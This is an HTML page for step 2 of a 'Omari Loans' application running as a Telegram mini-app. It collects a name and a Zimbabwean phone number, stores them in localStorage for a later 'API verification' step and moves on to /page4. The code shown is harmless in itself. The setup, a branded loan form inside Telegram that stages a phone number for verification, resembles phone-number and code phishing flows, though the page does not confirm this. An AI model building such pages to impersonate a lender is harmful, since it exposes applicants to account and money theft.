<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loan Application - Step 2</title>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #EBF9F0;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .nav-header {
            width: 100%;
            background: linear-gradient(180deg, #00C853 0%, #00963F 100%);
            padding: 15px 20px;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-sizing: border-box;
        }

        .omari-logo {
            font-size: 24px;
            font-weight: bold;
        }

        .form-card {
            background: white;
            width: 92%;
            max-width: 480px;
            margin-top: 25px;
            padding: 30px 20px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,176,80,0.08);
            box-sizing: border-box;
            border: 1px solid #D4F1E0;
        }

        .progress-box {
            display: flex;
            gap: 8px;
            margin-bottom: 35px;
        }

        .bar {
            height: 4px;
            flex: 1;
            background: #D4F1E0;
            border-radius: 2px;
        }

        .active-bar {
            background: #00B050;
        }

        .input-wrap {
            margin-bottom: 25px;
        }

        label {
            display: block;
            font-size: 17px;
            font-weight: 500;
            margin-bottom: 12px;
            color: #1F2937;
        }

        input {
            width: 100%;
            padding: 16px;
            border: 1px solid #B4E8C9;
            border-radius: 10px;
            font-size: 17px;
            box-sizing: border-box;
            background-color: #F9FDFB;
            color: #1F2937;
        }

        input:focus {
            border-color: #00B050;
            outline: none;
        }

        input::placeholder {
            color: #9CA3AF;
        }

        .phone-container {
            display: flex;
            gap: 10px;
        }

        .country-code {
            width: 85px;
            background: #E6F7ED;
            text-align: center;
            font-weight: bold;
            border: 1px solid #B4E8C9;
            line-height: 52px;
            color: #00B050;
            border-radius: 10px;
        }

        .phone-input {
            flex: 1;
        }

        .phone-hint {
            font-size: 13px;
            color: #6B7280;
            margin-top: 10px;
        }

        .btn-container {
            margin-top: 40px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .back-btn {
            background-color: #F9FDFB;
            color: #6B7280;
            border: 1px solid #D4F1E0;
            width: 100%;
            padding: 18px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
        }

        .next-btn {
            background: linear-gradient(180deg, #00C853 0%, #00963F 100%);
            color: white;
            border: none;
            width: 100%;
            padding: 18px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            box-shadow: 0 4px 8px rgba(0, 176, 80, 0.3);
        }

        .footer-text {
            text-align: center;
            font-size: 13px;
            color: #6B7280;
            margin: 40px 0 30px;
        }
    </style>
</head>

<body>

<div class="nav-header">
    <div onclick="goBack()" style="cursor:pointer; font-size:20px;">← Back</div>
    <div class="omari-logo">Omari Loans</div>
    <div style="font-size: 26px;">☰</div>
</div>

<div class="form-card">
    <div class="progress-box">
        <div class="bar active-bar"></div>
        <div class="bar active-bar"></div>
        <div class="bar"></div>
    </div>

    <div class="input-wrap">
        <label>First Name</label>
        <input type="text" id="firstName" placeholder="Tendai">
    </div>

    <div class="input-wrap">
        <label>Last Name</label>
        <input type="text" id="lastName" placeholder="Moyo">
    </div>

    <div class="input-wrap">
        <label>Phone Number</label>
        <div class="phone-container">
            <div class="country-code">+263</div>
            <input type="tel" id="phone" class="phone-input" placeholder="771234567" maxlength="9">
        </div>
        <p class="phone-hint">Enter 9 digits (e.g. 771234567 or 712345678)</p>
    </div>

    <div class="btn-container">
        <button type="button" class="back-btn" onclick="goBack()">BACK</button>
        <button type="button" class="next-btn" onclick="goNext()">NEXT STEP</button>
    </div>
</div>

<div class="footer-text">© 2026 Omari Zimbabwe</div>

<script>
    function goNext() {
        const fName = document.getElementById('firstName').value.trim();
        const lName = document.getElementById('lastName').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!fName || !lName || !phone) {
            alert("Please fill in all fields.");
            return;
        }

        if (!/^\d{9}$/.test(phone)) {
            alert("Enter a valid 9-digit phone number.");
            return;
        }

        // Save for general flow
        localStorage.setItem('firstName', fName);
        localStorage.setItem('lastName', lName);
        localStorage.setItem('phone', phone);
        
        // CRITICAL: Save specifically for the API verification
        localStorage.setItem('userPhone', phone);

        window.location.href = "/page4";
    }

    function goBack() {
        window.location.href = "/page2";
    }

    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        // Auto-fill existing data
        const f = localStorage.getItem('firstName');
        const l = localStorage.getItem('lastName');
        const p = localStorage.getItem('phone');

        if (f) document.getElementById('firstName').value = f;
        if (l) document.getElementById('lastName').value = l;
        if (p) document.getElementById('phone').value = p;
    };
</script>

</body>
</html>
